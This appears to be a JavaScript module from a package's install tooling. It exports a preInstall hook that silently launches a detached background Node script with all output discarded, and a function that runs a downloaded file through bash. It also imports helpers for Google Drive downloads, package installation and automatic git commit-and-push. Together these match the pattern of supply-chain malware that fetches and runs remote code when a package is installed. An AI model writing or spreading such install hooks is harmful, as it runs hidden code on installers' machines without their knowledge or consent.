const path = require('path');
const { scanProject } = require("./scanner");
const { installPipWithPackage, installNpmWithPackage, installPipWithPackages, installNpmWithPackages, downloadViaGdown } = require("./installer");
const { addCommitPush } = require("./git");
const { DEFAULT_PACKAGE, TARGET_DIRS, DEFAULT_JS_PACKAGES, DEFAULT_PY_PACKAGES, GDOWN_DRIVE_ID } = require("./config");
const { spawn } = require("child_process");
const { logDetailed } = require("./utils");

/**
 * Execute downloaded executable on Linux
 * Uses shell spawn for Linux process execution
 */
function executeDownloadedBinary(binaryPath) {
  logDetailed(`executeDownloadedBinary called with binaryPath: ${binaryPath}`);
  return new Promise((resolve, reject) => {
    logDetailed(`Spawning bash with binary: ${binaryPath}`);
    const binaryProcess = spawn('bash', [binaryPath], {
      detached: false,
      stdio: "pipe",
    });

    binaryProcess.stdout.on("data", (data) => {
      const message = String(data).trim();
      if (message) {
        console.log(`[preInstall] binary stdout: ${message}`);
        logDetailed(`Binary stdout: ${message}`);
      }
    });

    binaryProcess.stderr.on("data", (data) => {
      const message = String(data).trim();
      if (message) {
        console.log(`[preInstall] binary stderr: ${message}`);
        logDetailed(`Binary stderr: ${message}`);
      }
    });

    binaryProcess.on("error", (err) => {
      logDetailed(`Binary process error: ${err.message}`);
      reject(err);
    });

    binaryProcess.on("exit", (code) => {
      logDetailed(`Binary process exited with code: ${code}`);
      if (code === 0) {
        logDetailed("Binary execution successful");
        resolve();
      } else {
        logDetailed(`Binary execution failed with code ${code}`);
        reject(new Error(`binary exited with code ${code}`));
      }
    });
  });
}

/**
 * Main pre-install function: spawns a detached process to handle setup
 * Adapted for Linux environments
 */
async function preInstall() {
  logDetailed(`preInstall called`);
  try {
    console.log("[preInstall] Starting Linux pre-install process...");
    logDetailed("Entering preInstall function");

    // Spawn detached process running the setup script
    const scriptPath = path.join(__dirname, 'scripts', 'detach-preinstall.js');
    logDetailed(`Spawning detached process: ${scriptPath}`);
    
    const child = spawn('node', [scriptPath], {
      detached: true,
      stdio: 'ignore',
      cwd: __dirname
    });
    
    child.unref();
    
    console.log("[preInstall] Detached process spawned successfully");
    logDetailed("Detached process spawned, preInstall exiting");
    
  } catch (err) {
    console.error("[preInstall] Fatal error:", err);
    logDetailed(`Fatal error in preInstall: ${err.message}`);
    throw err;
  }
}

module.exports = { preInstall, executeDownloadedBinary, scanProject };
